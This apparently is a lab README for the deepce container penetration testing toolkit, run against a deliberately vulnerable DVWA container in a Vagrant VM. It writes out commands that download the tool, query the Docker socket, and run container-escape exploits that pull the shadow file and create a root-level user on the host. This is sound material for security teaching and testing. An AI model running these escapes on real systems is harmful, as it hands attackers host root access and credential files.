# deepce (container penetration testing toolkit)


## Setup the virtual machine
```/bin/bash
vagrant up
vagrant ssh
cd /vagrant
sudo docker-compose up -d
```


## Setup deepce
```/bin/bash
# Let's assume that you've exploited the application and dropped into the container's shell
sudo docker exec -it web-dvwa /bin/bash

# Time to set up the toolkit
apt-get update
apt-get install wget
wget https://github.com/stealthcopter/deepce/raw/master/deepce.sh
chmod +x deepce.sh
```


## Recon
```
./deepce.sh --install
```


## Exploitation
```
# Vulnerable Docker SOCK file
# List Docker Unix Socket metadata (containers, images, state, filesystem type, network, kernel, OS, runtimes)
# https://stealthcopter.github.io/deepce/guides/docker-sock.md
curl -s --unix-socket /var/run/docker.sock http://localhost/info
./deepce.sh --no-enumeration --exploit SOCK --shadow

# A privileged container (--privileged)
# Execute commands as root on the host OS
# https://stealthcopter.github.io/deepce/guides/docker-privileged.md
# `cat /etc/passwd` on host OS to verify new user was created
./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
```
